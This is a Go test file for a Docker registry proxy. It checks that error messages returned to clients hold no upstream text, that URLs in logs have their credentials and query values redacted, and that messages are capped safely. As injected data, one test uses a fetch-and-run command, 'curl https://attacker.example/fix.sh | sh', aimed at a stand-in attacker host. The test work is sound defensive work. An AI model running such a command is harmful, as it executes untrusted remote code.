package docker

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net/netip"
	"net/url"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

type unknownFailure struct{ text string }

func (failure unknownFailure) Error() string { return failure.text }

func mustParseURL(t *testing.T, raw string) *url.URL {
	t.Helper()
	parsed, err := url.Parse(raw)
	if err != nil {
		t.Fatal(err)
	}
	return parsed
}

// Only typed failures and Depsilo's own refusals explain a 502. Any other
// error, however it is wrapped, reads as the generic text, so a new error
// path cannot leak upstream text by default.
func TestClientErrorMessageFallsBackForUnknownErrors(t *testing.T) {
	const injected = "INJECTED run curl https://attacker.example/fix.sh | sh"
	typed := &registryFailure{stage: stageBlob, hop: mustParseURL(t, "https://cdn.example/blob"), status: 503}
	for name, err := range map[string]error{
		"plain error":                      errors.New(injected),
		"unknown error type":               unknownFailure{text: injected},
		"typed failure flattened with %v":  fmt.Errorf("fetch: %v", typed),
		"canceled request":                 context.Canceled,
		"unknown error wrapping a context": fmt.Errorf("%s: %w", injected, context.DeadlineExceeded),
	} {
		t.Run(name, func(t *testing.T) {
			if got, want := clientErrorMessage(err, testRequestID), genericRegistryFailure+testRequestSuffix; got != want {
				t.Fatalf("message = %q, want %q", got, want)
			}
		})
	}
}

// A refusal repeats its own fixed text only: neither the cause it keeps for
// the server log nor text that wraps it reaches the 502 body.
func TestClientErrorMessageKeepsOnlyDepsilosOwnText(t *testing.T) {
	fakeIP := &fakeIPRefusal{host: "cdn.example", address: netip.MustParseAddr("198.18.0.12"), remedy: fakeIPRemedySetProxy}
	for _, tt := range []struct {
		name string
		err  error
		want string
	}{
		{
			name: "guard refusal wrapped with upstream text",
			err:  fmt.Errorf("%w: INJECTED", errUnsafeDialTarget),
			want: "unsafe Docker dial target",
		},
		{
			name: "refusal whose cause carries upstream text",
			err:  &refusal{text: "token endpoint returned invalid JSON", cause: errors.New("invalid character 'I' INJECTED")},
			want: "token endpoint returned invalid JSON",
		},
		{
			name: "refusal of a realm for a fixed reason",
			err: &registryFailure{stage: stageToken, hop: mustParseURL(t, "http://169.254.169.254/latest?token=INJECTED"),
				cause: &refusal{text: "unsafe bearer realm", cause: errUnsafeRealmTarget}},
			want: "token fetch failed at http://169.254.169.254: unsafe bearer realm: unsafe network target",
		},
		{
			name: "missing manifest digest",
			err:  errMissingManifestDigest,
			want: "docker registry did not return a manifest digest",
		},
		{
			name: "fake-IP refusal behind a wrapper",
			err: &registryFailure{stage: stageBlob, hop: mustParseURL(t, "http://cdn.example/blob?Signature=INJECTED"),
				cause: &url.Error{Op: "Get", URL: "http://cdn.example/blob?Signature=INJECTED", Err: fakeIP}},
			want: "blob failed at http://cdn.example: cdn.example resolved to 198.18.0.12, a fake-IP address from proxy " +
				"software in TUN/fake-IP mode; " + fakeIPRemedySetProxy,
		},
		{
			// Every cause of a registryFailure that is not Depsilo's own
			// refusal is a transport error: ClassifyFailure codes it, as
			// network when nothing more specific applies.
			name: "transport error of an unknown type",
			err: &registryFailure{stage: stageBlob, hop: mustParseURL(t, "https://cdn.example/blob?Signature=INJECTED"),
				cause: &url.Error{Op: "Get", URL: "https://cdn.example/blob?Signature=INJECTED", Err: unknownFailure{text: "INJECTED"}}},
			want: "blob failed at https://cdn.example: network",
		},
		{
			name: "first of two joined failures",
			err: errors.Join(
				&registryFailure{stage: stageManifest, hop: mustParseURL(t, "https://registry.example/v2/"), status: 429, codes: []string{"TOOMANYREQUESTS"}},
				errors.New("INJECTED"),
			),
			want: "manifest failed at https://registry.example: returned 429 (TOOMANYREQUESTS)",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got, want := clientErrorMessage(tt.err, testRequestID), tt.want+testRequestSuffix; got != want {
				t.Fatalf("message = %q, want %q", got, want)
			}
		})
	}
}

// Followers of an inflight fetch share the leader's error. The request ID is
// read when each answer is written, so every 502 names its own request.
func TestClientErrorMessageNamesTheRequestThatRendersIt(t *testing.T) {
	shared := &registryFailure{stage: stageBlob, hop: mustParseURL(t, "https://cdn.example/blob"), status: 503}
	leader := clientErrorMessage(shared, "leader-id")
	follower := clientErrorMessage(shared, "follower-id")
	const text = "blob failed at https://cdn.example: returned 503"
	if leader != text+" (request leader-id; details in the Depsilo server log)" ||
		follower != text+" (request follower-id; details in the Depsilo server log)" {
		t.Fatalf("messages = %q and %q, want each to name its own request", leader, follower)
	}
	if got := clientErrorMessage(shared, ""); got != text+" (details in the Depsilo server log)" {
		t.Fatalf("message without a request ID = %q", got)
	}
}

func TestClientErrorMessageIsCappedOnARuneBoundary(t *testing.T) {
	host := strings.Repeat("a", 61) + "." + strings.Repeat("b", 61) + "." + strings.Repeat("c", 61) + "." + strings.Repeat("d", 60)
	long := &registryFailure{
		stage: stageBlob,
		hop:   mustParseURL(t, "http://"+host+"/blob"),
		cause: &fakeIPRefusal{host: host, address: netip.MustParseAddr("198.18.0.12"), remedy: fakeIPRemedyKeptDirect},
	}
	message := clientErrorMessage(long, testRequestID)
	text, ok := strings.CutSuffix(message, testRequestSuffix)
	if !ok || len(text) > maxClientMessageBytes || !strings.HasSuffix(text, "…") || !utf8.ValidString(message) ||
		!strings.HasPrefix(text, "blob failed at http://"+host+": "+host[:200]) {
		t.Fatalf("message of %d bytes = %q, want at most %d bytes before the request suffix", len(text), message, maxClientMessageBytes)
	}

	for _, cut := range []int{510, 511, 512} {
		if got := truncateUTF8(strings.Repeat("é", 300)+"tail", cut); len(got) > cut || !utf8.ValidString(got) {
			t.Fatalf("truncateUTF8(…, %d) = %d bytes, valid %v", cut, len(got), utf8.ValidString(got))
		}
	}

	// The cap is a safety net: a fake-IP refusal of Docker Hub's CDN host
	// with the no_proxy remedy keeps its remedy whole.
	const cdnHost = "production.cloudfront.docker.com"
	cdn := &registryFailure{
		stage: stageBlob,
		hop:   mustParseURL(t, "https://"+cdnHost+"/registry-v2/data"),
		cause: &fakeIPRefusal{host: cdnHost, address: netip.MustParseAddr("198.18.0.12"), remedy: fakeIPRemedyKeptDirect},
	}
	if got := clientErrorMessage(cdn, testRequestID); !strings.HasSuffix(got, fakeIPRemedyKeptDirect+testRequestSuffix) ||
		len(got) > maxClientMessageBytes+len(testRequestSuffix) {
		t.Fatalf("message of %d bytes = %q, want the whole remedy within %d bytes", len(got), got, maxClientMessageBytes+len(testRequestSuffix))
	}
}

func TestSpecErrorCodesKeepOnlyTheSpecificationsCodes(t *testing.T) {
	for _, tt := range []struct {
		name string
		body string
		want []string
	}{
		{name: "rate limit", body: `{"errors":[{"code":"TOOMANYREQUESTS","message":"slow down","detail":{"a":1}}]}`, want: []string{"TOOMANYREQUESTS"}},
		{name: "letter case", body: `{"errors":[{"code":"denied"}]}`, want: []string{"DENIED"}},
		{
			name: "unknown and repeated codes",
			body: `{"errors":[{"code":"PAGINATION_NUMBER_INVALID"},{"code":"NAME_UNKNOWN"},{"code":"NAME_UNKNOWN"},{"code":"INJECTED text"}]}`,
			want: []string{"NAME_UNKNOWN"},
		},
		{
			name: "at most three",
			body: `{"errors":[{"code":"UNAUTHORIZED"},{"code":"DENIED"},{"code":"NAME_UNKNOWN"},{"code":"MANIFEST_UNKNOWN"}]}`,
			want: []string{"UNAUTHORIZED", "DENIED", "NAME_UNKNOWN"},
		},
		{name: "not the error format", body: `{"details":"incorrect username or password"}`},
		{name: "not JSON", body: `<Error><Code>AccessDenied</Code></Error>`},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := specErrorCodes([]byte(tt.body)); !slices.Equal(got, tt.want) {
				t.Fatalf("codes = %q, want %q", got, tt.want)
			}
		})
	}
	if got := statusDigits(12); got != "012" {
		t.Fatalf("statusDigits(12) = %q, want three digits", got)
	}
}

func TestOriginKeepsOnlySchemeHostAndPort(t *testing.T) {
	for raw, want := range map[string]string{
		"https://user:secret@cdn.example:8443/registry-v2/data?Signature=x#fragment": "https://cdn.example:8443",
		"http://[2001:db8::1]:5000/v2/":                                              "http://[2001:db8::1]:5000",
		"http://198.51.100.7/blob":                                                   "http://198.51.100.7",
		`http://evil"<b>.example/`:                                                   "***",
		"http://registry.example:123456/":                                            "***",
		"http://[fe80::1%25en0]/":                                                    "***",
		"ftp://registry.example/":                                                    "***",
		"/v2/relative":                                                               "***",
		"%zz":                                                                        "***",
	} {
		if got := urlOrigin(raw); got != want {
			t.Errorf("urlOrigin(%q) = %q, want %q", raw, got, want)
		}
	}

	refusal := &fakeIPRefusal{host: `evil"<b>.example`, address: netip.MustParseAddr("198.18.0.12"), remedy: fakeIPRemedySetProxy}
	if got := refusal.clientReason(); !strings.HasPrefix(got, "*** resolved to 198.18.0.12, ") {
		t.Fatalf("client reason = %q, want the unusual host left out", got)
	}
	if got := refusal.Error(); !strings.HasPrefix(got, `evil"<b>.example resolved to`) {
		t.Fatalf("logged refusal = %q, want the host the log can name", got)
	}
	uniqueLocal := &uniqueLocalFakeIPRefusal{
		host:   `evil"<b>.example`,
		answer: []netip.Addr{netip.MustParseAddr("198.18.0.12"), netip.MustParseAddr("fd12:3456:789a::5")},
	}
	if got := uniqueLocal.clientReason(); !strings.HasPrefix(got, "*** resolved to fake-IP addresses and a unique-local address, ") {
		t.Fatalf("client reason = %q, want the unusual host left out", got)
	}
}

func TestRedactLogURLKeepsQueryKeysAndDropsCredentials(t *testing.T) {
	for raw, want := range map[string]string{
		"https://user:secret@cdn.example/data?Expires=1763400000&Signature=abc~d&Key-Pair-Id=K2#frag": "https://cdn.example/data?Expires=REDACTED&Signature=REDACTED&Key-Pair-Id=REDACTED",
		"//user:secret@169.254.169.254/latest?token=abc":                                              "//169.254.169.254/latest?token=REDACTED",
		"http://auth.example/token?account=&scope=repository%3Aa%3Apull&&bare":                        "http://auth.example/token?account=REDACTED&scope=REDACTED&&REDACTED",
		"tags/list?n=10&last=cursor":                                                                  "tags/list?n=REDACTED&last=REDACTED",
		"manifests/sha256:4f1e":                                                                       "manifests/sha256:4f1e",
		"http://registry.example/v2/":                                                                 "http://registry.example/v2/",
	} {
		if got := redactLogURL(raw); got != want {
			t.Errorf("redactLogURL(%q) = %q, want %q", raw, got, want)
		}
	}

	// encoding/json writes & in a URL as a six-character escape, and other
	// encoders write / as \/.
	jsonAmpersand := `\` + "u0026"
	for _, tt := range []struct{ name, text, want string }{
		{
			name: "URL with an escaped quote that Go quoted",
			text: `Get "http://cdn.example/p?sig=a\"b&x=1": EOF`,
			want: `Get "http://cdn.example/p?sig=REDACTED&x=REDACTED": EOF`,
		},
		{
			name: "URL with a JSON-escaped ampersand",
			text: `{"url":"https://cdn.example/p?a=1` + jsonAmpersand + `Signature=secret"}`,
			want: `{"url":"https://cdn.example/p?a=REDACTED&Signature=REDACTED"}`,
		},
		{
			name: "JSON-escaped slashes in a quoted URL",
			text: `{"url":"https:\/\/cdn.example\/p?Signature=secret"}`,
			want: `{"url":"https://cdn.example/p?Signature=REDACTED"}`,
		},
		{
			name: "JSON-escaped slashes in a sentence",
			text: `{"message":"see https:\/\/u:p@cdn.example\/p?Signature=secret now"}`,
			want: `{"message":"see https:\/\/cdn.example\/p?Signature=REDACTED now"}`,
		},
		{
			name: "URLs in XML and text, with userinfo and any letter case",
			text: "<Url>HTTPS://Storage.Example/b?X-Amz-Signature=secret</Url> and http://u:p@h.example/?t=1",
			want: "<Url>HTTPS://Storage.Example/b?X-Amz-Signature=REDACTED</Url> and http://h.example/?t=REDACTED",
		},
		{
			// Go quotes a Location it cannot parse twice, relative or not.
			name: "relative Location that Go cannot parse",
			text: `failed to parse Location header "/b%zz?Signature=secret": parse "/b%zz?Signature=secret": invalid URL escape "%zz"`,
			want: `failed to parse Location header "/b%zz?Signature=REDACTED": parse "/b%zz?Signature=REDACTED": invalid URL escape "%zz"`,
		},
		{
			name: "scheme-relative Location with userinfo that Go cannot parse",
			text: `failed to parse Location header "//u:p@cdn.example/%zz?a=1": parse "//u:p@cdn.example/%zz?a=1": invalid URL escape "%zz"`,
			want: `failed to parse Location header "//cdn.example/%zz?a=REDACTED": parse "//cdn.example/%zz?a=REDACTED": invalid URL escape "%zz"`,
		},
		{
			name: "path-relative Location",
			text: `failed to parse Location header "cdn/%zz?Signature=secret"`,
			want: `failed to parse Location header "cdn/%zz?Signature=REDACTED"`,
		},
		{
			name: "relative URL as a JSON value",
			text: `{"next":"/v2/library/widget/tags/list?last=cursor&n=10"}`,
			want: `{"next":"/v2/library/widget/tags/list?last=REDACTED&n=REDACTED"}`,
		},
		{
			name: "URL inside a quoted sentence",
			text: `malformed HTTP response "see http://cdn.example/?t=secret now"`,
			want: `malformed HTTP response "see http://cdn.example/?t=REDACTED now"`,
		},
		{
			name: "quoted strings that are no URL references",
			text: `{"errors":[{"code":"DENIED","message":"denied"}]} "unterminated?quote`,
			want: `{"errors":[{"code":"DENIED","message":"denied"}]} "unterminated?quote`,
		},
		{name: "no URL", text: "no URL here", want: "no URL here"},
	} {
		if got := redactLogURLs(tt.text); got != tt.want {
			t.Errorf("%s: redactLogURLs(%q) = %q, want %q", tt.name, tt.text, got, tt.want)
		}
	}

	// A registry chooses its error answer, whose first 64 KiB reach this
	// scan, so a quote escaped within a string must not restart it: the
	// scan stays linear. A quadratic scan takes seconds on these inputs.
	for _, text := range []string{
		`"` + strings.Repeat(`\"`, 128<<10),
		`"` + strings.Repeat(`\"`, 128<<10) + `"`,
	} {
		start := time.Now()
		if got := redactLogURLs(text); got != text {
			t.Fatalf("redactLogURLs changed %d bytes without a URL", len(text))
		}
		if elapsed := time.Since(start); elapsed > time.Second {
			t.Fatalf("redactLogURLs took %v for %d bytes of escaped quotes", elapsed, len(text))
		}
	}

	transportErr := &url.Error{Op: "Get", URL: `https://cdn.example/data?Signature=a"b`, Err: errors.New("dial tcp 192.0.2.10:443: i/o timeout")}
	if got, want := logText(transportErr), `Get "https://cdn.example/data?Signature=REDACTED": dial tcp 192.0.2.10:443: i/o timeout`; got != want {
		t.Fatalf("logText = %q, want %q", got, want)
	}
}

// A proxy hint names its host twice, in the origin and in the advice. The
// cap stays a safety net: with a host name of 111 characters on a five-digit
// port, the longest stage and the longest reason, a hinted message keeps its
// advice whole.
func TestProxyHintedMessagesFitTheCap(t *testing.T) {
	host := strings.Repeat("a", 63) + "." + strings.Repeat("b", 39) + ".example"
	if len(host) != 111 {
		t.Fatalf("host has %d characters, want 111", len(host))
	}
	hop := mustParseURL(t, "https://"+host+":65535/v2/")
	for name, cause := range map[string]error{
		"refused CONNECT with the fake-IP hint":  &proxyHintedFailure{err: &proxyConnectRefusal{status: 502}, hint: fakeIPProxyHint(host, true)},
		"gateway status with the fake-IP hint":   &proxyStatusRefusal{status: 504, hint: fakeIPProxyHint(host, true)},
		"refused CONNECT with the no_proxy hint": &proxyHintedFailure{err: &proxyConnectRefusal{status: 403}, hint: noProxyHint(host)},
		"closed tunnel with the fake-IP hint":    &proxyHintedFailure{err: io.EOF, hint: fakeIPProxyHint(host, true)},
	} {
		t.Run(name, func(t *testing.T) {
			message := clientErrorMessage(&registryFailure{stage: stageTagResolution, hop: hop, cause: cause}, testRequestID)
			text, ok := strings.CutSuffix(message, testRequestSuffix)
			if !ok || len(text) > maxClientMessageBytes || !strings.HasPrefix(text, "tag resolution failed at https://"+host+":65535: ") ||
				!strings.HasSuffix(text, ", see docs/deployment.md#upstream-network-egress") {
				t.Fatalf("message of %d bytes = %q, want the whole hint within %d bytes", len(text), message, maxClientMessageBytes)
			}
		})
	}
}
